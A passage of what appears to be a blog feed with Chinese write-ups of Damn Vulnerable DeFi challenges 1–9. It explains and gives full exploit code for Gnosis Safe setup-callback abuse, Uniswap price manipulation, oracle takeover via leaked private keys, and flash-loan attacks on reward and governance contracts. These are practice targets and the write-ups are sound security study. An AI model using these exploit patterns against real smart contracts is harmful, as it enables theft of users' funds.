data);</code>这明显是一个外部调用，这给我了一点希望。再仔细一看这里的参数确实是可以导致借入的。我们可以借此让钱包approve给我们所有的token，我们只需要把这个token转出来即可。</p></li></ul></li><li><p><strong>Exploit</strong><br>总结一下以上的分析，其实这个题就是利用了一个gnosis钱包的一个外部调用，再钱包的上下文中执行<code>approve</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;GnosisSafeProxy.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;GnosisSafeProxyFactory.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;IProxyCreationCallback.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;GnosisSafe.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableToken.sol&quot;;</span><br><span class="line">import &quot;hardhat&#x2F;console.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IGnosisSafe &#123;</span><br><span class="line">     function setup(</span><br><span class="line">        address[] calldata _owners,</span><br><span class="line">        uint256 _threshold,</span><br><span class="line">        address to,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        address fallbackHandler,</span><br><span class="line">        address paymentToken,</span><br><span class="line">        uint256 payment,</span><br><span class="line">        address payable paymentReceiver</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BackdoorExploit &#123;</span><br><span class="line"></span><br><span class="line">    DamnValuableToken immutable token;</span><br><span class="line">    GnosisSafeProxyFactory immutable gnosisFactory;</span><br><span class="line">    address registryAddress;</span><br><span class="line">    address masterCopyAddress;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _registryAddress,</span><br><span class="line">        address _masterCopyAddress,</span><br><span class="line">        address _walletFactory,</span><br><span class="line">        address _token</span><br><span class="line">    )&#123;</span><br><span class="line">        token &#x3D; DamnValuableToken(_token);</span><br><span class="line">        gnosisFactory &#x3D; GnosisSafeProxyFactory(_walletFactory);</span><br><span class="line">        registryAddress &#x3D; _registryAddress;</span><br><span class="line">        masterCopyAddress &#x3D; _masterCopyAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function GiveApprove(address _token, address _spender) external &#123;</span><br><span class="line">        DamnValuableToken(_token).approve(_spender, 10 * 10**18);</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The spender&#39;s address :&quot;, _spender);</span><br><span class="line">        console.log(&quot;The Giver&#39;s address:&quot;, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function creatWallet(address[] memory victims)external returns (address newproxy)&#123;</span><br><span class="line">        address[] memory owner &#x3D; new address[](1);</span><br><span class="line">        for(uint8 i &#x3D; 0; i &lt; victims.length; i++)&#123;</span><br><span class="line">            owner[0] &#x3D; victims[i];</span><br><span class="line">            bytes memory init &#x3D; abi.encodeWithSelector(</span><br><span class="line">                GnosisSafe.setup.selector, </span><br><span class="line">                owner,                                      &#x2F;&#x2F;新建钱包的owner</span><br><span class="line">                1,                                          &#x2F;&#x2F;threshold 只能为1</span><br><span class="line">                address(this),                              &#x2F;&#x2F;漏洞出现点</span><br><span class="line">                abi.encodeWithSelector(                     &#x2F;&#x2F;借入</span><br><span class="line">                    BackdoorExploit.GiveApprove.selector, </span><br><span class="line">                    address(token),</span><br><span class="line">                    address(this)</span><br><span class="line">                ),</span><br><span class="line">                address(0x0),</span><br><span class="line">                address(0x0),</span><br><span class="line">                0,</span><br><span class="line">                address(0x0)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        GnosisSafeProxy proxy &#x3D;  gnosisFactory.createProxyWithCallback(</span><br><span class="line">            masterCopyAddress,</span><br><span class="line">            init,</span><br><span class="line">            i,</span><br><span class="line">            IProxyCreationCallback(registryAddress)</span><br><span class="line">        );</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The msg.sender&#39;s address:&quot;, msg.sender);</span><br><span class="line">        console.log(&quot;The proxy&#39;s address:&quot;, address(proxy));</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The this address:&quot;, address(this));</span><br><span class="line">        DamnValuableToken(token).transferFrom(address(proxy), msg.sender, 10 *10**18);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 8-9</title>
      <link href="/DamnDefi-08-09/"/>
      <url>/DamnDefi-08-09/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-8-9"><a href="#Damn-Defi靶场刷题记录-8-9" class="headerlink" title="Damn Defi靶场刷题记录(8-9)"></a>Damn Defi靶场刷题记录(8-9)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="8-Puppet"><a href="#8-Puppet" class="headerlink" title="8 Puppet"></a>8 Puppet</h2><p>这个题直接通过abi引用了一个已经编译了的Uniswap v1的合约，因此，我们可以假定这个Uniswap合约没有其他漏洞。<br>那就让我们把目光集中在<code>PuppetPool</code>合约<br>其实就一个<code>borrow()</code>函数，但在借款时，我们需要抵押两倍的资金在池里。这个题其实就是想要我们想办法让池在我们抵押不足的情况下贷款给我们。<br>这其实就涉及到uniswap的原理了，有关uniswap v1我推荐看<a href="https://bbs.csdn.net/topics/606753811" target="_blank" rel="noopener">这篇文章</a><br>在了解了uniswap v1后，我们就应该知道，流动性对于一个uniswap池有多么重要，而题目中的这个池，其实并没有足够多的流动性来应对大规模的买进卖出。</p><blockquote><p>因此我们只需要出售我们手中所有的token，就会导致市场崩盘，价格失衡。(token大幅度贬值)，那么我们手中的ETH将会非常值钱，这时候我们再调用borrow函数，由于token的贬值，我们可以通过抵押我们手中的ETH获得几乎全部的token。</p></blockquote><ul><li><strong>Exploit</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">        &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);</span><br><span class="line">        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(</span><br><span class="line">            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),</span><br><span class="line">            1,</span><br><span class="line">            9999999999</span><br><span class="line">        );</span><br><span class="line">        &#x2F;&#x2F; 先计算borrow所有的token需要多少的eth</span><br><span class="line">        const amount &#x3D; await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, &#123;value:amount&#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></li></ul><h2 id="9-Puppet-v2"><a href="#9-Puppet-v2" class="headerlink" title="9 Puppet-v2"></a>9 Puppet-v2</h2><p>相比于上一道题，这次使用的时Uniswap-v2的源码，而交易所借款需要抵押的eth从借款价格的2倍变为了3倍。<br>但其实再了解Uniswap-v2以及这次的交易所代码后，发现其实和上道题没有本质的区别。<br>我们任然可以利用池中流动性不足这一点，引起价格的波动，使token贬值，以达到我们以少数eth借到大量token的目的。</p><ul><li><strong>Exploit</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">       &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">       await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);</span><br><span class="line">       &#x2F;&#x2F; 在交易所置换自己所有的token</span><br><span class="line">       await this.uniswapRouter.connect(attacker).swapExactTokensForETH(</span><br><span class="line">           ATTACKER_INITIAL_TOKEN_BALANCE,</span><br><span class="line">           0,</span><br><span class="line">           [this.token.address, this.uniswapRouter.WETH()],</span><br><span class="line">           attacker.address,</span><br><span class="line">           9999999999</span><br><span class="line">       );</span><br><span class="line">       </span><br><span class="line">       console.log(&#39;Attacker&#96;s balance:&#39;, (await ethers.provider.getBalance(attacker.address)).toString());</span><br><span class="line">       &#x2F;&#x2F;计算borrow所有token所需要的eth</span><br><span class="line">       const amount &#x3D; await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">       &#x2F;&#x2F;先往钱包里存钱</span><br><span class="line">       await this.weth.connect(attacker).deposit(&#123;value:amount&#125;);</span><br><span class="line">       await this.weth.connect(attacker).approve(this.lendingPool.address, amount);</span><br><span class="line">       await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 7</title>
      <link href="/DamnDefi-07/"/>
      <url>/DamnDefi-07/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-7"><a href="#Damn-Defi靶场刷题记录-7" class="headerlink" title="Damn Defi靶场刷题记录(7)"></a>Damn Defi靶场刷题记录(7)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="7-Compromised"><a href="#7-Compromised" class="headerlink" title="7 Compromised"></a>7 Compromised</h2><p>之所以单独把这个题拉出来做一个wp是因为这个题太特殊了，也因为8，9是一套题目。<br>这个题设置的背景就很奇怪，它给了我们一个服务器的响应片段，而这些片段是由两大串十六进制数组成的。<br>而我们目前并不知道这串十六进制数意味着什么，那么先来看看代码吧。</p><blockquote><p>通过粗略阅读后我们可以发现，这其实就是三个所谓的“可信报告者”所组成的一个预言机系统，最终的定价会以三个人的中位数为准，那么也就意味着我们只要控制两个人的行为，就可以操控价格。（想一想之前给的两串十六进制数，是不是能想到点什么呢？）</p></blockquote><p>再来看合约</p><ul><li><strong>TrustfulOracleInitializer</strong><br>这只是一个TrustfulOracle的初始化合约，没有什么内容</li><li><strong>TrustfulOracle</strong><br>这个预言机值得我们仔细阅读，首先，这个合约拓展了openzeppelin库的<code>AccessControlEnumerable.sol</code>，用来实现权限的管理，因为只有初始化的三个可信报告者可以定价。<br>这个预言机合约几乎提供了所有的可以修改价格的函数，报告者通过<code>postPrice()</code>来设定自己的价格，而<code>getMedianPrice()</code>是交易所来获取三个可信者定价中位数的函数，并以此来作为该交易的价格。</li></ul><p>似乎没有一个有明显漏洞的地方可以利用，我们不得不重新回到原点重新思考，也许题目中给的两串十六进制数会有重大作用。<br>那我们就从这两串十六进制数入手，先把这十六进制数通过ascii码转换一下：<br><code>MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5</code><br><code>MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4</code><br>得到了两串“啥也不是”的字符串，但还不甘心，于是想这任然可能是编码后的结果，于是就拿到工具里一个一个解码尝试，最终发现base64解码出来后是一个类似于私钥的字符串<br><code>0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</code><br><code>0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</code><br>再次拿着字符串去做公钥的计算，发现竟然和题目中的两个可信报告者公钥一致！那么我们就等于是拿到了两个可信者的公钥，我们现在就是可信者！<br>那么到此，此题迎刃而解，我们通过获取机制中超过半数的控制权，获得了定价的权利。</p><ul><li><strong>Exploit</strong><br>由于我们获取了定价的权利，因此我们可以用几乎为0的价格买入NFT而以巨大的金额卖出它！<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;        </span><br><span class="line">       &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">       &#x2F;&#x2F;用二者私钥创建钱包</span><br><span class="line">       const sources1 &#x3D; new ethers.Wallet(&quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;, ethers.provider);</span><br><span class="line">       const sources2 &#x3D; new ethers.Wallet(&quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;, ethers.provider);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;将NFT价格设置为1wei</span><br><span class="line">       await this.oracle.connect(sources1).postPrice(&quot;DVNFT&quot;, 1);</span><br><span class="line">       await this.oracle.connect(sources2).postPrice(&quot;DVNFT&quot;, 1);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;买入</span><br><span class="line">       await this.exchange.connect(attacker).buyOne(&#123;value:1&#125;);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;重新将价格设置为exchange合约的总余额</span><br><span class="line">       _balance &#x3D;  ethers.provider.getBalance(this.exchange.address);</span><br><span class="line">       await this.oracle.connect(sources1).postPrice(&quot;DVNFT&quot;, _balance);</span><br><span class="line">       await this.oracle.connect(sources2).postPrice(&quot;DVNFT&quot;, _balance);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;卖出</span><br><span class="line">       await this.nftToken.connect(attacker).approve(this.exchange.address, 0);</span><br><span class="line">       await this.exchange.connect(attacker).sellOne(0);</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F;重新把NFT价格复原</span><br><span class="line">       await this.oracle.connect(sources1).postPrice(&quot;DVNFT&quot;, INITIAL_NFT_PRICE);</span><br><span class="line">       await this.oracle.connect(sources2).postPrice(&quot;DVNFT&quot;, INITIAL_NFT_PRICE);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 5-6</title>
      <link href="/DamnDefi-05-06/"/>
      <url>/DamnDefi-05-06/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-5-6"><a href="#Damn-Defi靶场刷题记录-5-6" class="headerlink" title="Damn Defi靶场刷题记录(5-6)"></a>Damn Defi靶场刷题记录(5-6)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="the-rewarder"><a href="#the-rewarder" class="headerlink" title="the-rewarder"></a>the-rewarder</h2><p>FlashPool从一开始就获得一百万个代币，提到的4个人中的每一个人都获得100个DVT，这些DVT立即由他们存入奖励池。在此初始设置之后，时间提前5天，并支付一轮奖励：每人25个奖励代币。<br>这道题有四个合约，是第一道多合约的题目。不过不用害怕，我们一个一个来分析。</p><ul><li><strong>RewardToken</strong><br>这是一个简单的ERC20的Token，没有什么问题。唯一的区别就是这个奖励币可以被无限铸造。</li><li><strong>AccountingToken</strong><br>这是一个有访问控制管理的具有交易快照功能的Token，应该是针对每一轮的奖励而写的Token。不过看上去也没有问题。</li><li><strong>FlashLoanerPool</strong><br>这是比较常见的闪电贷池，让我们来具体看看它是怎么实现的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; liquidityToken.balanceOf(address(this));</span><br><span class="line">        require(amount &lt;&#x3D; balanceBefore, &quot;Not enough token balance&quot;);</span><br><span class="line"></span><br><span class="line">        require(msg.sender.isContract(), &quot;Borrower must be a deployed contract&quot;);</span><br><span class="line">        </span><br><span class="line">        liquidityToken.transfer(msg.sender, amount);</span><br><span class="line"></span><br><span class="line">        msg.sender.functionCall(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveFlashLoan(uint256)&quot;,</span><br><span class="line">                amount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        require(liquidityToken.balanceOf(address(this)) &gt;&#x3D; balanceBefore, &quot;Flash loan not paid back&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>明显的，出现了外部调用，这应该立马引起我们的警觉，这意味着我们可能利用<code>receiveFlashLoan()</code>函数干一些坏事。</li><li><strong>TheRewarderPool</strong><br>这应该是这个系统最核心的合约了，里面有存款，奖励，取款的一系列流程。<blockquote><p>存款会触发奖励分配功能。 首先检查是否经过了足够的时间来开始新一轮，如果是，它将创建快照。无论哪种方式，它都会根据他与所有其他用户的存款金额来计算呼叫者的奖励。然后，它检查调用方是否已经检索到当前回合的奖励，如果没有，则铸造计算出的奖励代币数量。</p></blockquote></li></ul><p>在了解了工作原理之后，我注意到了这个问题：如果你的时间安排得当，并用你的存款开始新一轮，<strong>你可以立即领取该轮的奖励并退出</strong>。从另一份合同中完成所有这些操作，这意味着在一次交易中，您可以使用闪回符并索取大部分奖励。</p><ul><li><strong>Exploit</strong><br>闪电贷函数有一个外部调用可以被我们利用，而奖励池里我们只需要存款进去，就可以立即获取奖励并退出。<blockquote><p>那么我们就可以从闪电贷池里jiu借钱存到奖励池里，领取奖励后取款，最后把钱还给借贷池就大功告成了。</p></blockquote></li></ul><p>来看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;FlashLoanerPool.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;TheRewarderPool.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RewarderExploit&#123;</span><br><span class="line"></span><br><span class="line">    FlashLoanerPool loanpool;</span><br><span class="line">    TheRewarderPool rewardpool;</span><br><span class="line">    RewardToken public immutable rewardToken;</span><br><span class="line">    DamnValuableToken public immutable liquidityToken;</span><br><span class="line">    address attacker;</span><br><span class="line"></span><br><span class="line">    constructor(address _loanpool, address _rewardpool, address _tokenAddress, address _rewardToken)&#123;</span><br><span class="line">        loanpool &#x3D; FlashLoanerPool(_loanpool);</span><br><span class="line">        rewardpool &#x3D; TheRewarderPool(_rewardpool);</span><br><span class="line">        liquidityToken &#x3D; DamnValuableToken(_tokenAddress);</span><br><span class="line">        rewardToken &#x3D; RewardToken(_rewardToken);</span><br><span class="line">        attacker &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 _amount) public &#123;</span><br><span class="line">        loanpool.flashLoan(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveFlashLoan(uint256 _amount) payable external&#123;</span><br><span class="line">        liquidityToken.approve(address(rewardpool), _amount);</span><br><span class="line">        rewardpool.deposit(_amount);</span><br><span class="line">        uint256 rewards &#x3D; rewardpool.distributeRewards();</span><br><span class="line">        rewardToken.transfer(attacker, rewards);</span><br><span class="line">        rewardpool.withdraw(_amount);</span><br><span class="line">        liquidityToken.transfer(address(loanpool), _amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>总结<br>这应该是所有希望激励用户存款的系统都会面临的漏洞（暂且叫闪借攻击吧），即使您为了防止来自闪借攻击，强制将回合开始（快照）放在与流动性存款不同的交易，拥有大量代币的用户仍然可以在一轮结束时存入它们，并在新一轮开始后立即提款。你的协议可能希望激励长期质押，而不是短期套利交易。<br>因此，最好是摆脱回合，根据存款的每一秒来计算奖励，就像今天许多现代DeFi项目所做的那样。</li></ul><h2 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h2><p>这个题和以往的题唯一不同的地方，就是多了一个治理机制。但同时，这个治理机制如果不安全，反而会适得其反。</p><ul><li><strong>SelfiePool</strong><br>这个池里有一个闪电贷的函数，同时有一个特殊的可以转出所有资金的函数<code>drainAllFunds()</code>。值得注意的是这个函数有一个修饰符<code>onlyGovernance</code>也就是只能被治理合约所调用，看起来非常安全，但其实我们一旦获得治理合约的控制权，我们就可以榨干<code>SelfiePool</code>.</li><li><p><strong>SimpleGovernance</strong><br>这就是之前提到的治理合约，显而易见的是我们需要在这里面找到漏洞干一些坏事。让我们来看看吧。<br>  这个合约比较复杂，我们简单说一说</p><ul><li>queueAction<blockquote><p>通过这个函数我们可以把data放进队列，而为了成功排队，我们必须拥有总供应量的一半以上，而由于我们现在有闪借池，这点很容易绕过。<br>  我们无法立即执行操作，因为有2天的延迟，我们必须先等待。但是，我们在这里所要做的就是将时间快进2天，因为没有什么可以确保我们在延迟期间仍然持有这些治理令牌</p></blockquote></li><li>executeAction<br>这个函数使用来执行的，按照队列id一个交易一个交易的执行，但是这个函数明显是有借入风险的，我们只需要把作为参数传入的address改为我们想借入的合约地址，然后在排队的时候修改<code>data</code>的内容，很容易做到这一点。这样，我们就可以冒充治理合约来调用<code>drainAllFunds()</code>了。</li></ul></li><li><p><strong>Exploit</strong><br>根据以上分析写出Exploit如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;SimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;SelfiePool.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfieExploit &#123;</span><br><span class="line"></span><br><span class="line">    SimpleGovernance public goverance;</span><br><span class="line">    SelfiePool public pool;</span><br><span class="line">    address attcker;</span><br><span class="line">    uint256 actionId;</span><br><span class="line">    constructor(address _pool, address _goverance)&#123;</span><br><span class="line">        pool &#x3D; SelfiePool(_pool);</span><br><span class="line">        goverance &#x3D; SimpleGovernance(_goverance);</span><br><span class="line">        attcker &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit (uint256 _amount) public &#123;</span><br><span class="line">        pool.flashLoan(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveTokens (address _token, uint256 amount) external &#123;</span><br><span class="line">        DamnValuableTokenSnapshot token &#x3D; DamnValuableTokenSnapshot(_token);</span><br><span class="line">        token.snapshot();</span><br><span class="line">        actionId &#x3D; goverance.queueAction(address(pool),</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;drainAllFunds(address)&quot;,</span><br><span class="line">                attcker</span><br><span class="line">            ),</span><br><span class="line">            0); </span><br><span class="line">        token.transfer(address(pool), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function drainToAttacker() external &#123;</span><br><span class="line">        goverance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>总结：治理合约越复杂，越可能出现漏洞，一定谨慎。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 1-4</title>
      <link href="/DamnDefi-01-04/"/>
      <url>/DamnDefi-01-04/</url>
      
